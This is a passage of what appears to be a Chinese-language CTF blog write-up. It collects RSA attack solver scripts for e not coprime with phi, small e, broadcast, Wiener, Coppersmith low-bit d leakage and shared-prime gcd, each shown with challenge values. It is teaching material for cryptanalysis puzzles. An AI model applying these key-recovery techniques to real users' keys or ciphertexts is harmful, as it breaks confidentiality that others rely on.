class="keyword">in</span> range(1, 4):</span><br><span class="line">        p = var(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">        p0 = solve_mod([3*p*low_d  == p + k*(n*p - p^2 - n + p)], 2^512)</span><br><span class="line">        maybe_p += [int(x[0]) <span class="keyword">for</span> x <span class="keyword">in</span> p0]</span><br><span class="line">    <span class="built_in">print</span>(maybe_p)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> maybe_p:</span><br><span class="line">        P = getFullP(x, n)</span><br><span class="line">        <span class="keyword">if</span> P: <span class="built_in">break</span></span><br><span class="line">    </span><br><span class="line">    P = int(P)</span><br><span class="line">    Q = n // P</span><br><span class="line">    </span><br><span class="line">    assert P*Q == n</span><br><span class="line">    </span><br><span class="line">    d = inverse_mod(3, (P-1)*(Q-1))</span><br><span class="line">    <span class="built_in">print</span>(hex(power_mod(c, d, n))[2:])</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = 92896523979616431783569762645945918751162321185159790302085768095763248357146198882641160678623069857011832929179987623492267852304178894461486295864091871341339490870689110279720283415976342208476126414933914026436666789270209690168581379143120688241413470569887426810705898518783625903350928784794371176183</span><br><span class="line">c = 56164378185049402404287763972280630295410174183649054805947329504892979921131852321281317326306506444145699012788547718091371389698969718830761120076359634262880912417797038049510647237337251037070369278596191506725812511682495575589039521646062521091457438869068866365907962691742604895495670783101319608530</span><br><span class="line">low_d = 787673996295376297668171075170955852109814939442242049800811601753001897317556022653997651874897208487913321031340711138331360350633965420642045383644955</span><br><span class="line">phase4(low_d, n, c)</span><br></pre></td></tr></table></figure><h2 id="公钥指数e相关攻击"><a href="#公钥指数e相关攻击" class="headerlink" title="公钥指数e相关攻击"></a>公钥指数e相关攻击</h2><h3 id="e与phi-不互素"><a href="#e与phi-不互素" class="headerlink" title="e与phi 不互素"></a>e与phi 不互素</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">e1 = 14606334023791426</span><br><span class="line">p1 = 121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span><br><span class="line">q1 = 130968576816900149996914427770826228884925960001279609559095138835900329492765336419489982304805369724685145941218640504262821549441728192761733409684831633194346504685627189375724517070780334885673563409259345291959439026700006694655545512308390416859315892447092639503318475587220630455745460309886030186593</span><br><span class="line">c1 = 11402389955595766056824801105373550411371729054679429421548608725777586555536302409478824585455648944737304660137306241012321255955693234304201530700362069004620531537922710568821152217381257446478619320278993539785699090234418603086426252498046106436360959622415398647198014716351359752734123844386459925553497427680448633869522591650121047156082228109421246662020164222925272078687550896012363926358633323439494967417041681357707006545728719651494384317497942177993032739778398001952201667284323691607312819796036779374423837576479275454953999865750584684592993292347483309178232523897058253412878901324740104919248</span><br><span class="line"></span><br><span class="line">e2 = 13813369129257838</span><br><span class="line">p2 = 121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span><br><span class="line">q2 = 94582257784130735233174402362819395926641026753071039760251190444144495369829487705195913337502962816079184062352678128843179586054535283861793827497892600954650126991213176547276006780610945133603745974181504975165082485845571788686928859549252522952174376071500707863379238688200493621993937563296490615649</span><br><span class="line">c2 = 7984888899827615209197324489527982755561403577403539988687419233579203660429542197972867526015619223510964699107198708420785278262082902359114040327940253582108364104049849773108799812000586446829979564395322118616382603675257162995702363051699403525169767736410365076696890117813211614468971386159587698853722658492385717150691206731593509168262529568464496911821756352254486299361607604338523750318977620039669792468240086472218586697386948479265417452517073901655900118259488507311321060895347770921790483894095085039802955700146474474606794444308825840221205073230671387989412399673375520605000270180367035526919</span><br></pre></td></tr></table></figure><p>解题脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from libnum import *</span><br><span class="line"> </span><br><span class="line">e1 = 14606334023791426</span><br><span class="line">e2 = 13813369129257838</span><br><span class="line">p = </span><br><span class="line">q1 = </span><br><span class="line">q2 = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line"> </span><br><span class="line">n1 = p*q1</span><br><span class="line">n2 = p*q2</span><br><span class="line"> </span><br><span class="line">phi1 = (p-1)*(q1-1)</span><br><span class="line">phi2 = (p-1)*(q2-1)</span><br><span class="line"> </span><br><span class="line">b = gmpy2.gcd(e1,e2)</span><br><span class="line">a1 = e1//b</span><br><span class="line">a2 = e2//b</span><br><span class="line">bd1 = gmpy2.invert(a1,phi1)</span><br><span class="line">bd2 = gmpy2.invert(a2,phi2)</span><br><span class="line">m1 = pow(c1,bd1,n1)</span><br><span class="line">m2 = pow(c2,bd2,n2)</span><br><span class="line"> </span><br><span class="line">c = solve_crt([m1, m2], [q1, q2]) </span><br><span class="line"> </span><br><span class="line">n = q1 * q2</span><br><span class="line">f = (q1 - 1) * (q2 - 1)</span><br><span class="line"> </span><br><span class="line">d2 = gmpy2.invert(7, f)</span><br><span class="line">m = pow(c, d2, n)</span><br><span class="line">msg = gmpy2.iroot(m, 2)[0]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(msg).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h3 id="低加密指数-已知e，n，c"><a href="#低加密指数-已知e，n，c" class="headerlink" title="低加密指数(已知e，n，c)"></a>低加密指数(已知e，n，c)</h3><p>e比较小时</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">e = 3</span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot((c+i*n),<span class="number">3</span>)[<span class="number">1</span>] == True:</span><br><span class="line">        m = gmpy2.iroot((c+i*n),<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">        break</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(binascii.unhexlify(hex(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><h3 id="低加密广播攻击"><a href="#低加密广播攻击" class="headerlink" title="低加密广播攻击"></a>低加密广播攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rsa_gb_def(c, n, e):</span><br><span class="line">    m1 = libnum.solve_crt(c, n)</span><br><span class="line">    m, s = gmpy2.iroot(m1, e)</span><br><span class="line">    m = int(m)</span><br><span class="line">    <span class="built_in">return</span> m</span><br><span class="line"></span><br><span class="line">e = 17</span><br><span class="line">n1 = 14628911682936716611458501697007036859460044243525290515096052103585430459755335375005202100114469571371360084664887335211277585652711111523095037589648375630146039444071400098427638768750755153219974194380355807078158427824557754939604018020265955042573660474772006646525311705184431094905718137297923127124517126579859336516891364853724635334011666814712424599592662398013241607855160919361308195967978220182785816761656927836373944699635667244275310680450562446433724968942835275279255823144471582249379035668825437133182865600026935116686574740844588839352146024513673500770611055698030333734066230166111140083923</span><br><span class="line">n2 = 16756694748293603983474688536179571665757862433174984877308316444468003022266277794769268134195205510197588585566270416339902269736376811449830775290335951504698137924773942880807921752691668522662285163130340474205633998154849689387759453003838730282756734975490180702422176361373516245372635401939755527017589503572550811648345570775428936487145892225736625411540461653083957762795820510109891180906709827194217045059033312564525916136573856999724346161896146703174418039344166251503310869772735585554127509732135494936119159784702673291794381095696332128950979288440758815310482211285712819274848744478643590996499</span><br><span class="line">n3 = 12023158079717019193506148537498877243668782424904061914991928068483879707115315968983829360560644394409575645736275352836086080024994045582242629571839276759393418303915955798990522990081795218822313146157773272844272865701134880180795342597049645358985187689813369428579614193015028249821853347208001645148169449968882591709833452960545988520048722323580338213590245476892223967673180144525106292453573842357322398199104132677638909964034937501684668442732786408572501007756270725934445316827054687741612177409932320532825182104820899546084015733164816993674100635828218335112393003462442685677115798304835391938681</span><br><span class="line">c1 = 786426913645332991929803636719878643130489430090701482974255190570111407517277263761161970232982615374753982050075781017755721714929721429185828101898786972242994012456972241276851428750970754773002966788642795040933520662931514953660571657013642671173456750800960592586345219252277575624120271330470724245201080094330964145796872211627254805407394764183615099525852600855622089361965086460279057625205099471122036599934609091062009161119885692567925924978687256063116915630947838112126347748759078024890458539541208153526564434483654508834147071166870006117573542198238493913144419569943131642262575848786399020602</span><br><span class="line">c2 = 14269311999815379511888097227418748728398011595172649708273598243317106830139061994801598925448165045032084910971094414749744701731066555194159863759072739031915833091715422787808666326235589236328864675164322734119047182014621724868200908222400504845559290620275973427127376594365043386362821355037781568524903149101953873768462097165128186788759111090267131443645126715520994688945363059795513931799317608292977574376954729552861360597103229877031117089231816770880909815561950691603994439997197261395452797893557057320175747162837857668062550646101714062365530246698404923128445182100334335447738834779014705114350</span><br><span class="line">c3 = 3204718091370324153305164801961074660508922478706979436653573192321723216725523523538914956544950802616295043619768261075799875855502834749045520466140056621489305006966280527055668378303630674311102581232313032585389907028715671091914904062961720585667564982641321454541632782484415075257140508738041786400512095949826279576159569786734978545737717138115729502475357594151593143140355121154223614868465202149338507796306863351134218879326031985027900678671697876083351974546516576983143592764763925335805465720148057651958521255276602933604064541840892578409973858867533575728482926007556060584654853884046046420855</span><br><span class="line"></span><br><span class="line">n = [n1, n2, n3]</span><br><span class="line">c = [c1, c2, c3]</span><br><span class="line">m = rsa_gb_def(c, n, e)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br></pre></td></tr></table></figure><h2 id="私钥d相关攻击"><a href="#私钥d相关攻击" class="headerlink" title="私钥d相关攻击"></a>私钥d相关攻击</h2><h3 id="维纳攻击small-d"><a href="#维纳攻击small-d" class="headerlink" title="维纳攻击small d"></a>维纳攻击small d</h3><h4 id="低解密指数攻击"><a href="#低解密指数攻击" class="headerlink" title="低解密指数攻击"></a>低解密指数攻击</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from secret import flag</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">p = getPrime(1024)</span><br><span class="line">q = getPrime(1024)</span><br><span class="line"></span><br><span class="line">d = getPrime(32)</span><br><span class="line">e = inverse(d, (p-1)*(q-1))</span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = pow(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span></span><br><span class="line"><span class="comment"># e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span></span><br><span class="line"><span class="comment"># n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span></span><br></pre></td></tr></table></figure><p>解题脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">def transform(x,y):       <span class="comment">#使用辗转相处将分数 x/y 转为连分数的形式</span></span><br><span class="line">    res=[]</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        res.append(x//y)</span><br><span class="line">        x,y=y,x%y</span><br><span class="line">    <span class="built_in">return</span> res</span><br><span class="line">    </span><br><span class="line">def continued_fraction(sub_res):</span><br><span class="line">    numerator,denominator=1,0</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sub_res[::-1]:      <span class="comment">#从sublist的后面往前循环</span></span><br><span class="line">        denominator,numerator=numerator,i*numerator+denominator</span><br><span class="line">    <span class="built_in">return</span> denominator,numerator   <span class="comment">#得到渐进分数的分母和分子，并返回</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#求解每个渐进分数</span></span><br><span class="line">def sub_fraction(x,y):</span><br><span class="line">    res=transform(x,y)</span><br><span class="line">    res=list(map(continued_fraction,(res[0:i] <span class="keyword">for</span> i <span class="keyword">in</span> range(1,len(res)))))  <span class="comment">#将连分数的结果逐一截取以求渐进分数</span></span><br><span class="line">    <span class="built_in">return</span> res</span><br><span class="line"></span><br><span class="line">def get_pq(a,b,c):      <span class="comment">#由p+q和pq的值通过维达定理来求解p和q</span></span><br><span class="line">    par=gmpy2.isqrt(b*b-4*a*c)   <span class="comment">#由上述可得，开根号一定是整数，因为有解</span></span><br><span class="line">    x1,x2=(-b+par)//(2*a),(-b-par)//(2*a)</span><br><span class="line">    <span class="built_in">return</span> x1,x2</span><br><span class="line"></span><br><span class="line">def wienerAttack(e,n):</span><br><span class="line">    <span class="keyword">for</span> (d,k) <span class="keyword">in</span> sub_fraction(e,n):  <span class="comment">#用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span></span><br><span class="line">        <span class="keyword">if</span> k==0:                     <span class="comment">#可能会出现连分数的第一个为0的情况，排除</span></span><br><span class="line">            <span class="built_in">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e*d-1)%k!=0:             <span class="comment">#ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span></span><br><span class="line">            <span class="built_in">continue</span></span><br><span class="line">        </span><br><span class="line">        phi=(e*d-1)//k               <span class="comment">#这个结果就是 φ(n)</span></span><br><span class="line">        px,qy=get_pq(1,n-phi+1,n)</span><br><span class="line">        <span class="keyword">if</span> px*qy==n:</span><br><span class="line">            p,q=abs(int(px)),abs(int(qy))     <span class="comment">#可能会得到两个负数，负负得正未尝不会出现</span></span><br><span class="line">            d=gmpy2.invert(e,(p-1)*(q-1))     <span class="comment">#求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span></span><br><span class="line">            <span class="built_in">return</span> d</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;该方法不适用&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">e = 14058695417015334071588010346586749790539913287499707802938898719199384604316115908373997739604466972535533733290829894940306314501336291780396644520926473</span><br><span class="line">n = 33608051123287760315508423639768587307044110783252538766412788814888567164438282747809126528707329215122915093543085008547092423658991866313471837522758159</span><br><span class="line">d=wienerAttack(e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d=&quot;</span>,d)</span><br></pre></td></tr></table></figure><h3 id="d低位泄露"><a href="#d低位泄露" class="headerlink" title="d低位泄露"></a>d低位泄露</h3><p><a href="https://www.ruanx.net/coppersmith">Coppersmith 攻击 (ruanx.net)</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">n=92896523979616431783569762645945918751162321185159790302085768095763248357146198882641160678623069857011832929179987623492267852304178894461486295864091871341339490870689110279720283415976342208476126414933914026436666789270209690168581379143120688241413470569887426810705898518783625903350928784794371176183</span><br><span class="line"></span><br><span class="line">e=3</span><br><span class="line"></span><br><span class="line">m=random.getrandbits(512)</span><br><span class="line"></span><br><span class="line">c=pow(m,e,n)=56164378185049402404287763972280630295410174183649054805947329504892979921131852321281317326306506444145699012788547718091371389698969718830761120076359634262880912417797038049510647237337251037070369278596191506725812511682495575589039521646062521091457438869068866365907962691742604895495670783101319608530</span><br><span class="line"></span><br><span class="line">d&amp;((<span class="number">1</span>&lt;&lt;<span class="number">512</span>)-<span class="number">1</span>)=<span class="number">787673996295376297668171075170955852109814939442242049800811601753001897317556022653997651874897208487913321031340711138331360350633965420642045383644955</span></span><br><span class="line"></span><br><span class="line">long_to_bytes(m).encode(&#x27;hex&#x27;)=</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">def getFullP(low_p, n):</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    p = x*2^512 + low_p</span><br><span class="line">    root = (p-n).monic().small_roots(X = 2^128, beta = 0.4)</span><br><span class="line">    <span class="keyword">if</span> root:</span><br><span class="line">        <span class="built_in">return</span> p(root[0])</span><br><span class="line">    <span class="built_in">return</span> None</span><br><span class="line">    </span><br><span class="line">def phase4(low_d, n, c):</span><br><span class="line">    maybe_p = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(1, 4):</span><br><span class="line">        p = var(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">        p0 = solve_mod([3*p*low_d  == p + k*(n*p - p^2 - n + p)], 2^512)</span><br><span class="line">        maybe_p += [int(x[0]) <span class="keyword">for</span> x <span class="keyword">in</span> p0]</span><br><span class="line">    <span class="built_in">print</span>(maybe_p)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> maybe_p:</span><br><span class="line">        P = getFullP(x, n)</span><br><span class="line">        <span class="keyword">if</span> P: <span class="built_in">break</span></span><br><span class="line">    </span><br><span class="line">    P = int(P)</span><br><span class="line">    Q = n // P</span><br><span class="line">    </span><br><span class="line">    assert P*Q == n</span><br><span class="line">    </span><br><span class="line">    d = inverse_mod(3, (P-1)*(Q-1))</span><br><span class="line">    <span class="built_in">print</span>(hex(power_mod(c, d, n))[2:])</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = 92896523979616431783569762645945918751162321185159790302085768095763248357146198882641160678623069857011832929179987623492267852304178894461486295864091871341339490870689110279720283415976342208476126414933914026436666789270209690168581379143120688241413470569887426810705898518783625903350928784794371176183</span><br><span class="line">c = 56164378185049402404287763972280630295410174183649054805947329504892979921131852321281317326306506444145699012788547718091371389698969718830761120076359634262880912417797038049510647237337251037070369278596191506725812511682495575589039521646062521091457438869068866365907962691742604895495670783101319608530</span><br><span class="line">low_d = 787673996295376297668171075170955852109814939442242049800811601753001897317556022653997651874897208487913321031340711138331360350633965420642045383644955</span><br><span class="line"></span><br><span class="line">phase4(low_d, n, c)</span><br></pre></td></tr></table></figure><h2 id="公约数"><a href="#公约数" class="headerlink" title="公约数"></a>公约数</h2><p>题目如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">m=bytes_to_long(b&#x27;xxxxxx&#x27;)</span><br><span class="line">e=65537</span><br><span class="line">p=getPrime(1024)</span><br><span class="line">q1=getPrime(1024)</span><br><span class="line">q2=getPrime(1024)</span><br><span class="line">n1=p*q1</span><br><span class="line">n2=p*q2</span><br><span class="line">c1=pow(m,e,n1)</span><br><span class="line">c2=pow(m,e,n2)</span><br><span class="line">n3=n1^n2</span><br><span class="line">print(&#x27;n1=&#x27;,n1)</span><br><span class="line">print(&#x27;n3=&#x27;,n3)</span><br><span class="line">print(&#x27;c1=&#x27;,c1)</span><br><span class="line">print(&#x27;c2=&#x27;,c2)</span><br><span class="line">#n1= 9852079772293301283705208653824307027320071498525390578148444258198605733768947108049676831872672654449631852459503049139275329796717506126689710613873813880735666507857022786447784753088176997374711523987152412069255685005264853118880922539048290400078105858759506186417678959028622484823376958194324034590514104266608644398160457382895380141070373685334979803658172378382884352616985632157233900719194944197689860219335238499593658894630966428723660931647038577670614850305719449893199713589368780231046895222526070730152875112477675102652862254926169713030701937231206405968412044029177246460558028793385980934233</span><br><span class="line">#n3= 4940268030889181135441311597961813780480775970170156650560367030148383674257975796516865571557828263935532335958510269356443566533284856608454193676600884849913964971291145182724888816164723930966472329604608512023988191536173112847915884014445539739070437180314205284883149421228744714989392788108329929896637182055266508625177260492776962915873036873839946591259443753924970795669864031580632650140641456386202636466624658715315856453572441182758855085077441336516178544978457053552156714181607801760605521338788424464551796638531143900048375037218585999440622490119344971822707261432953755569507740550277088437182</span><br><span class="line">#c1= 7066425618980522033304943700150361912772559890076173881522840300333719222157667104461410726444725540513601550570478331917063911791020088865705346188662290524599499769112250751103647749860198318955619903728724860941709527724500004142950768744200491448875522031555564384426372047270359602780292587644737898593450148108629904854675417943165292922990980758572264063039172969633878015560735737699147707712154627358077477591293746136250207139049702201052305840453700782016480965369600667516646007546442708862429431724013679189842300429421340122052682391471347471758814138218632022564279296594279507382548264409296929401260</span><br><span class="line">#c2= 854668035897095127498890630660344701894030345838998465420605524714323454298819946231147930930739944351187708040037822108105697983018529921300277486094149269105712677374751164879455815185393395371001495146490416978221501351569800028842842393448555836910486037183218754013655794027528039329299851644787006463456162952383099752894635657833907958930587328480492546831654755627949756658554724024525108575961076341962292900510328611128404001877137799465932130220386963518903892403159969133882215092783063943679288192557384595152566356483424061922742307738886179947575613661171671781544283180451958232826666741028590085269</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line">n1= 9852079772293301283705208653824307027320071498525390578148444258198605733768947108049676831872672654449631852459503049139275329796717506126689710613873813880735666507857022786447784753088176997374711523987152412069255685005264853118880922539048290400078105858759506186417678959028622484823376958194324034590514104266608644398160457382895380141070373685334979803658172378382884352616985632157233900719194944197689860219335238499593658894630966428723660931647038577670614850305719449893199713589368780231046895222526070730152875112477675102652862254926169713030701937231206405968412044029177246460558028793385980934233</span><br><span class="line">n3= 4940268030889181135441311597961813780480775970170156650560367030148383674257975796516865571557828263935532335958510269356443566533284856608454193676600884849913964971291145182724888816164723930966472329604608512023988191536173112847915884014445539739070437180314205284883149421228744714989392788108329929896637182055266508625177260492776962915873036873839946591259443753924970795669864031580632650140641456386202636466624658715315856453572441182758855085077441336516178544978457053552156714181607801760605521338788424464551796638531143900048375037218585999440622490119344971822707261432953755569507740550277088437182</span><br><span class="line">c1= 7066425618980522033304943700150361912772559890076173881522840300333719222157667104461410726444725540513601550570478331917063911791020088865705346188662290524599499769112250751103647749860198318955619903728724860941709527724500004142950768744200491448875522031555564384426372047270359602780292587644737898593450148108629904854675417943165292922990980758572264063039172969633878015560735737699147707712154627358077477591293746136250207139049702201052305840453700782016480965369600667516646007546442708862429431724013679189842300429421340122052682391471347471758814138218632022564279296594279507382548264409296929401260</span><br><span class="line">c2= 854668035897095127498890630660344701894030345838998465420605524714323454298819946231147930930739944351187708040037822108105697983018529921300277486094149269105712677374751164879455815185393395371001495146490416978221501351569800028842842393448555836910486037183218754013655794027528039329299851644787006463456162952383099752894635657833907958930587328480492546831654755627949756658554724024525108575961076341962292900510328611128404001877137799465932130220386963518903892403159969133882215092783063943679288192557384595152566356483424061922742307738886179947575613661171671781544283180451958232826666741028590085269</span><br><span class="line">e=65537</span><br><span class="line"></span><br><span class="line">n2=n1^n3</span><br><span class="line">p=gmpy2.gcd(n1,n2)</span><br><span class="line">q1=n1//p</span><br><span class="line">q2=n2//p</span><br><span class="line">phi1=(p-1)*(q1-1)</span><br><span class="line">d=gmpy2.invert(e,phi1)</span><br><span class="line">m=gmpy2.powmod(c1,d,n1)</span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure><h2 id="公钥加签"><a href="#公钥加签" class="headerlink" title="公钥加签"></a>公钥加签</h2><p>flag.enc和pub.pem两个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 